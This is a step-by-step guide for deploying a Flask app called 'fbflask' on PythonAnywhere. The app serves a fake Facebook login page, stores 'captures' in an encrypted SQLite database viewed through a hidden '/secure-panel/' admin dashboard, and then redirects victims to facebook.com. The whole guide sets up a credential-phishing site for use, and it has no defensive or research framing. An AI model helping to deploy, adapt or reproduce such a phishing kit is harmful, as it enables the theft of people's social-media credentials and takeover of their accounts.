# Deploy on PythonAnywhere – Step by Step

## What you need
- A PythonAnywhere account (free tier works)
- This zip file uploaded and extracted

---

## STEP 1 – Upload the files

1. Log in to https://www.pythonanywhere.com
2. Click **Files** in the top menu
3. Click **Upload a file** → upload `fbflask.zip`
4. Open a **Bash console** (Dashboard → New console → Bash)
5. In the console, run:

```bash
cd ~
unzip fbflask.zip
```

You now have a folder: `/home/yourusername/fbflask/`

---

## STEP 2 – Install dependencies

In the same Bash console:

```bash
cd ~/fbflask
pip install --user flask==3.0.3 cryptography==42.0.5
```

> PythonAnywhere free tier uses Python 3.10 by default.
> If you get a version error, run: `pip3.10 install --user flask cryptography`

---

## STEP 3 – Initialise the database

```bash
cd ~/fbflask
python setup.py
```

You should see: `Database initialised at instance/data.db`

The database lives at `~/fbflask/instance/data.db` and **survives all restarts**.

---

## STEP 4 – Set your admin password (optional but recommended)

```bash
cp .env.example .env
nano .env
```

Change `ADMIN_PASSWORD=admin123` to something strong.
Press `Ctrl+X` → `Y` → `Enter` to save.

---

## STEP 5 – Create the web app

1. Go to **Web** tab in PythonAnywhere
2. Click **Add a new web app**
3. Click **Next** → choose **Manual configuration**
4. Select **Python 3.10** → click **Next**
5. Click **Next** again (ignore the path shown, you'll override it)

---

## STEP 6 – Configure the WSGI file

1. On the Web tab, find **WSGI configuration file** and click the link
   (it looks like `/var/www/yourusername_pythonanywhere_com_wsgi.py`)
2. **Delete everything** in that file
3. **Paste this** (replace `yourusername` with your actual username):

```python
import sys
import os

# Add your project folder to the path
project_home = '/home/yourusername/fbflask'
if project_home not in sys.path:
    sys.path.insert(0, project_home)

# Load .env if present
from pathlib import Path
_env = Path(project_home) / '.env'
if _env.exists():
    for line in _env.read_text().splitlines():
        line = line.strip()
        if line and not line.startswith('#') and '=' in line:
            k, v = line.split('=', 1)
            os.environ.setdefault(k.strip(), v.strip())

# Init DB and get app
from app import app, init_db
init_db()
application = app
```

4. Click **Save**

---

## STEP 7 – Set the source code directory

Still on the **Web** tab:

- **Source code**: `/home/yourusername/fbflask`
- **Working directory**: `/home/yourusername/fbflask`

---

## STEP 8 – Reload and test

1. Click the big green **Reload** button at the top of the Web tab
2. Visit your site: `https://yourusername.pythonanywhere.com`

You should see the Facebook login page.

3. Test the admin panel: `https://yourusername.pythonanywhere.com/secure-panel/`
   - Default password: `admin123` (or whatever you set in `.env`)

---

## URLs

| Page | URL |
|------|-----|
| Login page | `https://yourusername.pythonanywhere.com/` |
| Admin panel | `https://yourusername.pythonanywhere.com/secure-panel/` |
| Admin dashboard | `https://yourusername.pythonanywhere.com/secure-panel/dashboard` |

---

## Changing the redirect URL

After someone clicks Log in:
1. Go to the admin dashboard
2. Click **Settings** tab
3. Edit **Redirect URL** → save

Default is `https://facebook.com`. Change it to any URL.

---

## Data persistence

- All captures are saved in `~/fbflask/instance/data.db` (SQLite)
- The encryption key is saved in `~/fbflask/instance/enc.key`
- The Flask secret is saved in `~/fbflask/instance/secret.txt`
- **None of these are deleted when you reload or restart your web app**
- Do not delete the `instance/` folder

---

## Changing the admin password after deploy

Edit `~/fbflask/.env` via PythonAnywhere Files tab or console:

```bash
nano ~/fbflask/.env
# change ADMIN_PASSWORD=yournewpassword
# save with Ctrl+X → Y → Enter
```

Then reload the web app from the Web tab.

---

## Troubleshooting

**500 error on first load?**
→ Check the error log on the Web tab → Error log link
→ Most likely: run `python setup.py` in a Bash console first

**"Module not found" error?**
→ Make sure you ran: `pip install --user flask cryptography`

**Admin panel not working?**
→ Make sure you're visiting `/secure-panel/` (with trailing slash)

**Logs not showing?**
→ Go to admin dashboard → click Refresh button
